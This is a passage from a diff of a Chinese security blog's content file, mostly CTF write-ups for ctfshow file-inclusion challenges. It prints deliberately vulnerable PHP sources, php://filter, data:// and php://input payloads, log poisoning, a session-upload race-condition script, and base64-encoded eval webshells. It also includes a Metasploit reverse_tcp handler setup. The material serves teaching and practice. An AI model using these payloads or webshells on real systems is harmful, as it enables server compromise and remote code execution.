-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;handler     #加载模块</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp    #设置payload</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lhost kali的ip   #设置kali的ip</span><br><span class="line">lhost &#x3D;&gt; 192.168.152.131</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lport 1211   #设置kali的端口</span><br><span class="line">lport &#x3D;&gt; 1211</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; exploit   #执行</span><br><span class="line">[*] Started reverse TCP handler on 222.222.221.140:1211 </span><br></pre></td></tr></table></figure>]]></content>
+<h2 id="web-78"><a class="header-anchor" href="#web-78">¶</a>web 78</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+<h2 id="web-79"><a class="header-anchor" href="#web-79">¶</a>web 79</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload: ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;</span><br></pre></td></tr></table></figure>
+<h2 id="web-80-81"><a class="header-anchor" href="#web-80-81">¶</a>web 80-81</h2>
+<p>试了试文件日志包含漏洞</p>
+<p>先抓包,发现是nginx，一般的日志路径为  <code>/var/log/nginx/access.log</code></p>
+<p>访问发现成功</p>
+<p>进行getshell  先ls (可能需要多go几次)</p>
+<p><a href="https://imgchr.com/i/sClU7n"><img src="https://s3.ax1x.com/2021/01/03/sClU7n.png" alt="sClU7n.png"></a></p>
+<p>得到flag</p>
+<p><a href="https://imgchr.com/i/sClscF"><img src="https://s3.ax1x.com/2021/01/03/sClscF.png" alt="sClscF.png"></a></p>
+<h2 id="web82-86"><a class="header-anchor" href="#web82-86">¶</a>web82-86</h2>
+<p><strong>这题是利用 session.upload_progress 包含文件漏洞</strong></p>
+<p>session.upload_progress在php5.4添加的。</p>
+<p>在php.ini有以下几个默认选项</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled &#x3D; on</span><br><span class="line">2. session.upload_progress.cleanup &#x3D; on</span><br><span class="line">3. session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq &#x3D; &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq &#x3D; &quot;1&quot;</span><br></pre></td></tr></table></figure>
+<ol>
+<li>
+<p><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p>
+</li>
+<li>
+<p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</p>
+</li>
+<li>
+<p><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</p>
+<p><a href="https://imgchr.com/i/sCl27R"><img src="https://s3.ax1x.com/2021/01/03/sCl27R.png" alt="sCl27R.png"></a></p>
+</li>
+<li>
+<p><code>prefix+name</code>将表示为session中的键名</p>
+</li>
+</ol>
+<p>另外，再添加个session配置中一个重要选项。</p>
+<p><code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。</p>
+<p><strong>分析</strong></p>
+<p>如果<strong>session.auto_start=On</strong> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行<strong>session_start()</strong>。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，<strong>session.use_strict_mode</strong>默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p>
+<p>但是问题来了，默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，</p>
+<p>此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p>
+<p><strong>session文件默认存储路径</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">var</span>/lib/php/sess_PHPSESSID</span><br><span class="line">/<span class="keyword">var</span>/lib/php/sessions/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>
+<p>进入正题</p>
+<p><strong>题目源码:</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">\# -*- coding: utf-8 -*-</span><br><span class="line">\# @Author: h1xa</span><br><span class="line">\# @Date:  2020-09-16 11:25:09</span><br><span class="line">\# @Last Modified by:  h1xa</span><br><span class="line">\# @Last Modified time: 2020-09-16 19:34:45</span><br><span class="line">\# @email: h1xa@ctfer.com</span><br><span class="line">\# @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">  $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">  $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">  $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">  $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">  $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">  include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>以POST的形式发包，上传的文件随意,下面是构造的上传表单</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;79b5dbc7-b641-4e30-b8d9-4278f2234938.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>抓包，这里我们添加一个 Cookie :PHPSESSID=flag ，session文件的位置我们根据上文的常见的几个测试，在/tmp/sess_PHPSESSID下成功访问且不报错，说明在/tmp/sess_PHPSESSID目录下, 所以PHP将会在服务器上创建一个文件：/tmp/sess_flag”    然后我们在PHP_SESSION_UPLOAD_PROGRESS下添加我们的执行代码，修改如下</p>
+<p><a href="https://imgchr.com/i/sClocD"><img src="https://s3.ax1x.com/2021/01/03/sClocD.png" alt="sClocD.png"></a></p>
+<p>因为我们在上面这个页面添加的ID值是flag，所以传参?file=/tmp/sess_flag,抓包</p>
+<p>修改如下：这个a是随便加的，主要是为了方便爆破</p>
+<p><a href="https://imgchr.com/i/sClj4P"><img src="https://s3.ax1x.com/2021/01/03/sClj4P.png" alt="sClj4P.png"></a></p>
+<p>两个包payload设置如下</p>
+<p><a href="https://imgchr.com/i/sC1SgS"><img src="https://s3.ax1x.com/2021/01/03/sC1SgS.png" alt="sC1SgS.png"></a></p>
+<p>条件竞争，将POST的包和传file的包都开启爆破，即可得到目录</p>
+<p><a href="https://imgchr.com/i/sC1PBj"><img src="https://s3.ax1x.com/2021/01/03/sC1PBj.png" alt="sC1PBj.png"></a></p>
+<p>同理也能得到flag</p>
+<p><a href="https://imgchr.com/i/sC1ZCV"><img src="https://s3.ax1x.com/2021/01/03/sC1ZCV.png" alt="sC1ZCV.png"></a></p>
+<p><strong>也可以使用python脚本</strong></p>
+<p>也直接用前面文章里的脚本：</p>
+<p>附上大佬的脚本</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;Qftm&#x27;</span></span><br><span class="line"></span><br><span class="line">def POST(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            <span class="string">&#x27;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/&#x27;</span>,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;cat *&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval(<span class="subst">$_POST</span>[mtfQ])?&gt;&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;q.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">def READ(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(f<span class="string">&#x27;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/?file=/tmp/sess_&#123;sessid&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> not in response.text:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(response.text)</span><br><span class="line">            sys.<span class="keyword">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    READ(session)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>改下url和要执行的shell即可</p>
+<p><strong>参考文章:</strong></p>
+<p><a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
+<p><a href="https://blog.csdn.net/qq_44657899/article/details/109281343">https://blog.csdn.net/qq_44657899/article/details/109281343</a></p>
+<p><a href="https://www.cnblogs.com/NPFS/p/13795170.html">https://www.cnblogs.com/NPFS/p/13795170.html</a></p>
+<h2 id="web83"><a class="header-anchor" href="#web83">¶</a>web83</h2>
+<p><strong>源码:</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Warning: session_destroy(): Trying to destroy uninitialized session in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 14</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 20:28:52</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line"></span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>warning提示了  ，所以表单构造需要重新构造，多了 <code>session_start();</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;668ba926-9165-49e7-92fb-c94a08d54feb.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;2333&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>web82-86用py脚本都能跑过</strong></p>
+<h2 id="web84"><a class="header-anchor" href="#web84">¶</a>web84</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 20:40:01</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    system(&quot;rm -rf &#x2F;tmp&#x2F;*&quot;);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="web85"><a class="header-anchor" href="#web85">¶</a>web85</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 20:59:51</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    if(file_exists($file))&#123;</span><br><span class="line">        $content &#x3D; file_get_contents($file);</span><br><span class="line">        if(strpos($content, &quot;&lt;&quot;)&gt;0)&#123;</span><br><span class="line">            die(&quot;error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        include($file);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="web86"><a class="header-anchor" href="#web86">¶</a>web86</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 21:20:43</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line">define(&#39;还要秀？&#39;, dirname(__FILE__));</span><br><span class="line">set_include_path(还要秀？);</span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="web87"><a class="header-anchor" href="#web87">¶</a>web87</h2>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:57:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>分析源码，这题有两个传参，file和 content，然后将content参数的值写入到file参数所定义的文件里，但是一同写入的还有，在开头增加了die的过程，导致即使我们成功写入一句话，也执行不了，我们所要做的就是绕过die</p>
+<p>这里放上p神的 <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#_1">谈一谈php://filter的妙用</a></p>
+<p>p神文章已经讲得很清楚了，base64算法解码时是4个byte一组, 而phpdie共6个字符，所以我们解码的时候需要再添加两个字符</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php(file的内容需要进行两次url编码)</span><br><span class="line"></span><br><span class="line">content&#x3D;aaPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+<p>写入一句话后，然后访问 1.php，就可以执行shell了</p>
+<p><a href="https://imgchr.com/i/sC1NvD"><img src="https://s3.ax1x.com/2021/01/03/sC1NvD.png" alt="sC1NvD.png"></a></p>
+<h2 id="web88"><a class="header-anchor" href="#web88">¶</a>web88</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-17 02:27:25</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line"> *&#x2F;</span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    if(preg_match(&quot;&#x2F;php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\&#x3D;|\.&#x2F;i&quot;, $file))&#123;</span><br><span class="line">        die(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>data协议绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4</span><br><span class="line"></span><br><span class="line">即 ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,</span><br></pre></td></tr></table></figure>
+<h2 id="其他包含小姿势"><a class="header-anchor" href="#其他包含小姿势">¶</a>其他包含小姿势</h2>
+<p>审计中可见这样的包含模版文件：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&quot;inc/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&quot;.htm&quot;</span>); <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<ol>
+<li>%00截断<br>
+/etc/passwd%00<br>
+(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</li>
+<li>%00截断目录遍历：<br>
+/var/www/%00<br>
+(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</li>
+<li>路径长度截断：<br>
+/etc/passwd/././././././.[…]/./././././.<br>
+(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</li>
+<li>点号截断：<br>
+/boot.ini/………[…]…………<br>
+(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</li>
+</ol>
+<h3 id="php-input"><a class="header-anchor" href="#php-input">¶</a>php://input</h3>
+<p>php://input协议主要用于访问各个输入/输出流。CTF中经常使用<code>file_get_contents</code>获取php://input内容(POST)，需要开启allow_url_include，并且当<code>enctype=&quot;multipart/form-data&quot;</code>的时候 php://input是无效的。</p>
+<p><strong>利用方式：<code>?file=php://input 数据利用POST传过去</code></strong></p>
+<blockquote>
+<p>碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据。</p>
+</blockquote>
+<p>假设页面源代码为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">if (@file_get_content($file) &#x3D;&#x3D; &#39;meizijiu&#39;) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>直接使用Hackbar工具POST数据：</p>
+<p><a href="https://imgchr.com/i/sC1DUI"><img src="https://s3.ax1x.com/2021/01/03/sC1DUI.png" alt="sC1DUI.png"></a></p>
+<p>另外还可以写入一句话</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">post数据:</span><br><span class="line">&lt;?php </span><br><span class="line">echo file_put_contents(&quot;test.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4&#x3D;&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>参考</strong>:<a href="https://ca0y1h.top/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">https://ca0y1h.top/Web_security/basic_learning/13.文件包含漏洞利用/</a></p>
+<p><a href="https://www.cnblogs.com/NPFS/p/13797449.html">https://www.cnblogs.com/NPFS/p/13797449.html</a></p>
+]]></content>
       <categories>
-        <category>渗透测试</category>
-        <category>msf shell制作</category>
+        <category>刷题站</category>
+        <category>ctfshow</category>
       </categories>
   </entry>
   <entry>
@@ -802,90 +785,20 @@ payload: cat flag.php||</p>
       </categories>
   </entry>
   <entry>
-    <title>记一题php$$变量覆盖</title>
-    <url>/2021/01/09/php$$%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
-    <content><![CDATA[<p>彻底学一下$$变量覆盖</p>
+    <title>msf的shell在windows中的利用</title>
+    <url>/2020/12/20/msfvenom%E7%9A%84shell%E5%9C%A8windows%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>msf的shell的制作</p>
 <a id="more"></a>
-<h1>题目</h1>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">$_403 &#x3D; &quot;Access Denied&quot;;</span><br><span class="line">$_200 &#x3D; &quot;Welcome Admin&quot;;</span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] !&#x3D; &quot;POST&quot;)</span><br><span class="line">    die(&quot;BugsBunnyCTF is here :p...&quot;);</span><br><span class="line">if ( !isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">    die($_403);</span><br><span class="line">foreach ($_GET as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $$value;</span><br><span class="line">foreach ($_POST as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $value;</span><br><span class="line">if ( $_POST[&quot;flag&quot;] !&#x3D;&#x3D; $flag )</span><br><span class="line">    die($_403);</span><br><span class="line">echo &quot;This is your flag : &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br></pre></td></tr></table></figure>
-<h2 id="分析"><a class="header-anchor" href="#分析">¶</a>分析</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] !&#x3D; &quot;POST&quot;)</span><br><span class="line">    die(&quot;BugsBunnyCTF is here :p...&quot;);</span><br></pre></td></tr></table></figure>
-<p>请求方式需为POST</p>
